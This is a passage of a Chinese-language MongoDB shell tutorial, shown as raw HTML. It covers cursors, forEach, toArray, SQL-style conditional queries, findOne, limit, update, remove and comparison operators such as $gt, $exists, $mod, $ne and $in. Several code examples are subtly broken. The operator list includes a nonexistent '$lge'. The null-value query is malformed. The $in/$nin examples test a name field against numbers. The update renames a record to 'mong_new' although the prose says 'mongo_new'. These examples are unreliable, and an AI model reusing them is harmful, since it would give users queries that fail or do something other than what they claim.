class="string">&quot;name&quot;</span> : <span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">34</span> }</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x4E0A;&#x9762;&#x4F8B;&#x5B50;&#x663E;&#x793A;&#x4E86;&#x6E38;&#x6807;&#x98CE;&#x683C;&#x7684;&#x8FED;&#x4EE3;&#x8F93;&#x51FA;&#x3002;<code>hasNext()</code>&#x51FD;&#x6570;&#x544A;&#x8BC9;&#x6211;&#x4EEC;&#x662F;&#x5426;&#x8FD8;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5219;&#x53EF;&#x4EE5;&#x8C03;&#x7528;<code>next()</code>&#x51FD;&#x6570;.</p><p>&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#x662F;JavaScript shell&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x5230;JS&#x7684;&#x7279;&#x6027;&#xFF0C;forEach&#x5C31;&#x53EF;&#x4EE5;&#x8F93;&#x51FA;&#x6E38;&#x6807;&#x4E86;&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x662F;&#x4F7F;&#x7528;forEach()&#x6765;&#x5FAA;&#x73AF;&#x8F93;&#x51FA;&#x7684;: forEach()&#x5FC5;&#x987B;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x4F9B;&#x6BCF;&#x4E2A;&#x6E38;&#x6807;&#x5143;&#x7D20;&#x8C03;&#x7528;&#xFF1A;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.things.find().forEach(printjson)</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e064b7e83be0e107f68&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;mongo&quot;</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e124b7e83be0e107f69&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">3</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6a&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">1</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6b&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">2</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6c&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">3</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6d&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">4</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6e&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">5</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6f&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">6</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f70&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">7</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f71&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">8</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f72&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">9</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : <span class="number">3</span>, <span class="string">&quot;name&quot;</span> : <span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">34</span> }</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;MongoDB shell&#x91CC;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x628A;&#x6E38;&#x6807;&#x5F53;&#x4F5C;&#x6570;&#x7EC4;&#x6765;&#x7528;&#xFF1A;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cursor=db.things.find()</span><br><span class="line">&gt; printjson(cursor[<span class="number">1</span>])</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e124b7e83be0e107f69&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">3</span> }</span><br><span class="line">&gt; printjson(cursor[<span class="number">2</span>])</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6a&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">1</span> }</span><br><span class="line">&gt; printjson(cursor[<span class="number">0</span>])</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e064b7e83be0e107f68&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;mongo&quot;</span> }</span><br><span class="line">&gt; printjson(cursor[<span class="number">12</span>])</span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528;&#x6E38;&#x6807;&#x7684;&#x65F6;&#x5019;&#x8BF7;&#x6CE8;&#x610F;&#x5360;&#x7528;&#x5185;&#x5B58;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x5F88;&#x5927;&#x7684;&#x6E38;&#x6807;&#x5BF9;&#x8C61;&#xFF0C;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x5185;&#x5B58;&#x6EA2;&#x51FA;&#x3002;&#x6240;&#x4EE5;&#x5E94;&#x8BE5;&#x7528;&#x8FED;&#x4EE3;&#x7684;&#x65B9;&#x5F0F;&#x8F93;&#x51FA;&#x3002;&#x628A;&#x6E38;&#x6807;&#x8F6C;&#x6362;&#x6210;&#x771F;&#x5B9E;&#x7684;&#x6570;&#x7EC4;&#x7C7B;&#x578B;&#xFF1A;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">var</span> arr=db.things.find().toArray()</span><br><span class="line">&gt; arr[<span class="number">0</span>]</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e064b7e83be0e107f68&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;mongo&quot;</span> }</span><br><span class="line">&gt; arr[<span class="number">11</span>]</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : <span class="number">3</span>, <span class="string">&quot;name&quot;</span> : <span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">34</span> }</span><br><span class="line">&gt; arr[<span class="number">12</span>]</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BF7;&#x6CE8;&#x610F;&#x8FD9;&#x4E9B;&#x7279;&#x6027;&#x77E5;&#x8BC6;&#x5728;MongoDB shell&#x91CC;&#x4F7F;&#x7528;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x5176;&#x4ED6;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x9A71;&#x52A8;&#x90FD;&#x652F;&#x6301;&#x3002;MongoDB&#x6E38;&#x6807;&#x5BF9;&#x8C61;&#x4E0D;&#x662F;&#x6CA1;&#x6709;&#x5FEB;&#x7167;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x5728;&#x96C6;&#x5408;&#x91CC;&#x7B2C;&#x4E00;&#x6B21;&#x6216;&#x8005;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x8C03;&#x7528;<code>next()</code>&#xFF0C;&#x4F60;&#x53EF;&#x80FD;&#x5F97;&#x4E0D;&#x5230;&#x6E38;&#x6807;&#x91CC;&#x7684;&#x6570;&#x636E;&#x3002;&#x6240;&#x4EE5;&#x8981;&#x660E;&#x786E;&#x7684;&#x9501;&#x5B9A;&#x4F60;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x6E38;&#x6807;&#x3002;</p><h3 id="&#x6761;&#x4EF6;&#x67E5;&#x8BE2;"><a href="#&#x6761;&#x4EF6;&#x67E5;&#x8BE2;" class="headerlink" title="&#x6761;&#x4EF6;&#x67E5;&#x8BE2;"></a>&#x6761;&#x4EF6;&#x67E5;&#x8BE2;</h3><p>&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;SQL&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x662F;&#x600E;&#x4E48;&#x5728;MongoDB&#x91CC;&#x5B9E;&#x73B0;&#x7684;&#xFF1F;&#x8FD9;&#x91CC;&#x662F;&#x5728;MongoDB shell&#x91CC;&#x67E5;&#x8BE2;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x5176;&#x4ED6;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x9A71;&#x52A8;&#x6216;&#x8005;&#x8BED;&#x8A00;&#x6765;&#x5B9E;&#x73B0;&#xFF1A;<br>| |<br>| &#x2014; |<br>| <strong>SQL&#xFF1A;</strong> |<br>| SELECT * FROM things WHERE name=&#x201D;mongo&#x201D;; |<br>| <strong>MongoDB&#xFF1A;</strong> |<br>| db.things.find({name:&#x201D;mongo&#x201D;}).forEach(printjson) |</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><strong>SQL&#xFF1A;</strong></td></tr><tr><td>SELECT * FROM things WHERE x=4;</td></tr><tr><td><strong>MongoDB&#xFF1A;</strong></td></tr><tr><td>db.things.find({x:4}).forEach(printjson)</td></tr></tbody></table><p>&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x65F6;<code>{a:A, b:B}</code>&#x7C7B;&#x4F3C;&#x4E8E;<code>where a==A and b==B and ...</code></p><p>&#x4E0A;&#x9762;&#x663E;&#x793A;&#x7684;&#x662F;&#x6240;&#x6709;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x8FD4;&#x56DE;&#x7279;&#x5B9A;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;&#x8FD4;&#x56DE;&#x8868;&#x91CC;&#x7684;&#x67D0;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5728;find({x:4})&#x91CC;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x7684;&#x540D;&#x5B57;</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><strong>SQL&#xFF1A;</strong></td></tr><tr><td>SELECT j FROM things WHERE x=4</td></tr><tr><td><strong>MongoDB&#xFF1A;</strong></td></tr><tr><td>db.things.find({x:4},{j:true})</td></tr></tbody></table><h3 id="findOne"><a href="#findOne" class="headerlink" title="findOne()"></a><code>findOne()</code></h3><p>&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8003;&#x8651;&#xFF0C;MongoDB shell&#x907F;&#x514D;&#x6E38;&#x6807;&#x53EF;&#x80FD;&#x5E26;&#x6765;&#x7684;&#x5F00;&#x9500;&#xFF0C;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;<code>findOne()</code>&#x51FD;&#x6570;&#x3002;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x548C;find()&#x51FD;&#x6570;&#x4E00;&#x6837;&#xFF0C;&#x4E0D;&#x8FC7;&#x5B83;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x6E38;&#x6807;&#x91CC;&#x7684;&#x7B2C;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x5185;&#x5BB9;&#x5219;&#x8FD4;&#x56DE;null&#x503C;&#x3002;</p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; printjson(db.things.findOne({name:&quot;mongo&quot;}))</span><br><span class="line">{ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a><code>limit</code></h3><p>&#x5982;&#x679C;&#x9700;&#x8981;&#x9650;&#x5236;&#x7ED3;&#x679C;&#x96C6;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x8C03;&#x7528;<code>limit</code>&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x662F;&#x5F3A;&#x70C8;&#x63A8;&#x8350;&#x89E3;&#x51B3;&#x6027;&#x80FD;&#x95EE;&#x9898;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x9650;&#x5236;&#x6761;&#x6570;&#x6765;&#x51CF;&#x5C11;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#xFF0C;&#x4F8B;&#x5982;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.things.find().limit(<span class="number">4</span>)</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e064b7e83be0e107f68&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;mongo&quot;</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e124b7e83be0e107f69&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">3</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6a&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">1</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6b&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">2</span> }</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><hr><h2 id="&#x4FEE;&#x6539;&#x8BB0;&#x5F55;"><a href="#&#x4FEE;&#x6539;&#x8BB0;&#x5F55;" class="headerlink" title="&#x4FEE;&#x6539;&#x8BB0;&#x5F55;"></a>&#x4FEE;&#x6539;&#x8BB0;&#x5F55;</h2><p>&#x7528;&#x6570;&#x636E;&#x5E93;&#x7684;&#x63CF;&#x8FF0;&#x65B9;&#x5F0F;&#x5C31;&#x662F;&#xFF1A;&#x5C06;name&#x5B57;&#x6BB5;&#xFF0C;&#x503C;&#x4E3A;mongo&#x7684;&#x4E00;&#x6761;&#x5185;&#x5BB9;&#x4FEE;&#x6539;&#x4E3A;mongo_new&#xFF1A;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.things.update({<span class="attr">name</span>:<span class="string">&quot;mongo&quot;</span>},{<span class="attr">$set</span>:{<span class="attr">name</span>:<span class="string">&quot;mong_new&quot;</span>}})</span><br><span class="line">WriteResult({ <span class="string">&quot;nMatched&quot;</span> : <span class="number">1</span>, <span class="string">&quot;nUpserted&quot;</span> : <span class="number">0</span>, <span class="string">&quot;nModified&quot;</span> : <span class="number">1</span> })</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x5220;&#x9664;&#x8BB0;&#x5F55;"><a href="#&#x5220;&#x9664;&#x8BB0;&#x5F55;" class="headerlink" title="&#x5220;&#x9664;&#x8BB0;&#x5F55;"></a>&#x5220;&#x9664;&#x8BB0;&#x5F55;</h2><p>&#x5C06;&#x7528;&#x6237;name&#x662F;mong_new&#x7684;&#x8BB0;&#x5F55;&#x5220;&#x9664;:<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; printjson(db.things.findOne({<span class="attr">name</span>:<span class="string">&quot;mong_new&quot;</span>}))</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e064b7e83be0e107f68&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;mong_new&quot;</span> }</span><br><span class="line"></span><br><span class="line">&gt; db.things.remove({<span class="attr">name</span>:<span class="string">&quot;mong_new&quot;</span>})</span><br><span class="line">WriteResult({ <span class="string">&quot;nRemoved&quot;</span> : <span class="number">1</span> })</span><br><span class="line">&gt; db.things.findOne({<span class="attr">name</span>:<span class="string">&quot;mong_new&quot;</span>})</span><br><span class="line"><span class="literal">null</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x9AD8;&#x7EA7;&#x67E5;&#x8BE2;"><a href="#&#x9AD8;&#x7EA7;&#x67E5;&#x8BE2;" class="headerlink" title="&#x9AD8;&#x7EA7;&#x67E5;&#x8BE2;"></a>&#x9AD8;&#x7EA7;&#x67E5;&#x8BE2;</h2><h2 id="&#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26;"><a href="#&#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26;" class="headerlink" title="&#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26;"></a>&#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26;</h2><p><code>&lt;</code>&#x3001;<code>&lt;=</code>&#x3001;<code>&gt;</code>&#x3001;<code>&gt;=</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db.collection.find({<span class="string">&quot;fields&quot;</span>: {<span class="attr">$gt</span>: value}})</span><br><span class="line">db.collection.find({<span class="string">&quot;fields&quot;</span>: {<span class="attr">$lt</span>: value}})</span><br><span class="line">db.collection.find({<span class="string">&quot;fields&quot;</span>: {<span class="attr">$gte</span>: value}})</span><br><span class="line">db.collection.find({<span class="string">&quot;fields&quot;</span>: {<span class="attr">$lge</span>: value}})</span><br><span class="line"><span class="comment">// &#x591A;&#x4E2A;&#x6761;&#x4EF6;</span></span><br><span class="line">db.collection.find({<span class="string">&quot;fields&quot;</span>:{<span class="attr">$gt</span>:value1, <span class="attr">$lt</span>: value2}});</span><br></pre></td></tr></tbody></table></figure><p><strong><code>$exists</code></strong> &#x5224;&#x65AD;&#x5B57;&#x6BB5;&#x662F;&#x5426;&#x5B58;&#x5728;</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#x67E5;&#x8BE2;&#x5B58;&#x5728;age&#x5B57;&#x6BB5;&#x7684;&#x8BB0;&#x5F55;</span></span><br><span class="line">db.c1.find({<span class="attr">age</span>:{<span class="attr">$exists</span>:<span class="literal">true</span>}})</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x67E5;&#x8BE2;name&#x5B57;&#x6BB5;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x8BB0;&#x5F55;</span></span><br><span class="line">db.c2.find({<span class="attr">name</span>:{<span class="attr">$exists</span>:<span class="literal">false</span>}})</span><br></pre></td></tr></tbody></table></figure><p><strong>NULL</strong> &#x503C;&#x5904;&#x7406;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x67E5;&#x8BE2;&#x8BB0;&#x5F55;&#x6392;&#x67E5;null&#x503C;</span></span><br><span class="line">db.c1.find({<span class="string">&quot;age&quot;</span>:<span class="string">&quot;$in&quot;</span>:[<span class="literal">null</span>],<span class="string">&quot;$exists&quot;</span>:<span class="literal">true</span>})</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong><code>$mod</code></strong> &#x53D6;&#x6A21;&#x8FD0;&#x7B97;</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x67E5;&#x8BE2;age&#x5B57;&#x6BB5;&#xFF0C;&#x53D6;&#x6A21;6&#x7B49;&#x4E8E;1&#x7684;&#x6570;&#x636E;</span></span><br><span class="line">&gt; db.c2.find({<span class="attr">age</span>:{<span class="attr">$mod</span>:[<span class="number">6</span>,<span class="number">1</span>]}})</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ab&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user1&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">19</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b1&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user7&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">25</span> }</span><br><span class="line"><span class="comment">// &#x67E5;&#x8BE2;age&#x5B57;&#x6BB5;&#xFF0C;&#x53D6;&#x6A21;2&#x7B49;&#x4E8E;0&#x7684;&#x6570;&#x636E;</span></span><br><span class="line">&gt; db.c2.find({<span class="attr">age</span>:{<span class="attr">$mod</span>:[<span class="number">2</span>,<span class="number">0</span>]}})</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ac&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user2&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">20</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ae&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user4&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">22</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b0&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user6&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">24</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b2&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user8&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">26</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b4&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user10&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">28</span> }</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p><strong><code>$ne</code></strong> &#x4E0D;&#x7B49;&#x4E8E;</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x67E5;&#x8BE2;x&#x4E0D;&#x7B49;&#x4E8E;3&#x7684;&#x8BB0;&#x5F55;</span></span><br><span class="line">&gt; db.things.find({<span class="attr">x</span>:{<span class="attr">$ne</span>:<span class="number">3</span>}})</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6a&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">1</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6b&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">2</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6c&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">3</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6d&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">4</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6e&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">5</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6f&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">6</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f70&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">7</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f71&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">8</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f72&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">9</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : <span class="number">3</span>, <span class="string">&quot;name&quot;</span> : <span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">34</span> }</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p><strong><code>$in</code> &#x548C; <code>$nin</code> </strong>&#xFF0C;&#x5305;&#x542B;&#x548C;&#x4E0D;&#x5305;&#x542B;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.c2.find({<span class="string">&quot;name&quot;</span>:{<span class="string">&quot;$in&quot;</span>:[<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>]}})</span><br><span class="line"></span><br><span class="line">&gt; db.c2.find({<span class="string">&quot;name&quot;</span>:{<span class="string">&quot;$nin&quot;</span>:[<span class="number">20</span>]}})</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong><code>count()</code></strong> 